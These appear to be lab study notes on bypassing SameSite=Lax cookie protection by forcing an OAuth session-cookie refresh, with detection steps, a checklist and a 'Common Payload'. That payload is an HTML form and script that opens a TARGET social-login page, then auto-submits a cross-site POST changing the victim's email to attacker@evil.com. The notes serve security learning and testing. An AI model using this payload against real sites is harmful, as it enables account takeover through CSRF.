# OAuth Cookie Refresh Notes

## Overview

This technique abuses OAuth authentication flows to force a victim's browser to receive a fresh session cookie.

The fresh cookie activates Chrome's temporary:

```text
120 Second SameSite=Lax Grace Period
```

allowing cross-site POST requests that would normally be blocked.

---

# Detection Methodology

## Step 1

Inspect session cookie:

```http
Set-Cookie:
session=XYZ
```

---

## Step 2

Check if SameSite is missing.

Example:

```http
Set-Cookie:
session=XYZ
```

No:

```http
SameSite=Lax
```

present.

---

## Step 3

Search for:

```text
OAuth
OIDC
SSO
Social Login
```

Endpoints.

---

Common endpoints:

```text
/social-login
/oauth
/login/social
/auth/callback
/sign-in
```

---

## Step 4

Observe whether:

```text
New Session Cookie
```

is issued repeatedly.

---

# Testing Checklist

```text
[ ] OAuth present
[ ] Cookie refreshes
[ ] SameSite not explicit
[ ] No CSRF token
[ ] State-changing POST endpoint
```

---

# Attack Flow

OAuth Login
↓
New Cookie
↓
120 Second Window
↓
Cross-Site POST
↓
CSRF Success

---

# Common Payload

```html
<form method="POST"
action="https://TARGET/my-account/change-email">

<input type="hidden"
name="email"
value="attacker@evil.com">

</form>

<script>

window.onclick = () => {

window.open(
'https://TARGET/social-login'
);

setTimeout(changeEmail,5000);

}

function changeEmail() {
document.forms[0].submit();
}

</script>
```

---

# Related Lab

- lab10-samesite-lax-bypass-via-oauth-cookie-refresh.md

---

# Key Takeaways

- OAuth can refresh session cookies.
- Fresh cookies receive special browser treatment.
- SameSite=Lax is not complete CSRF protection.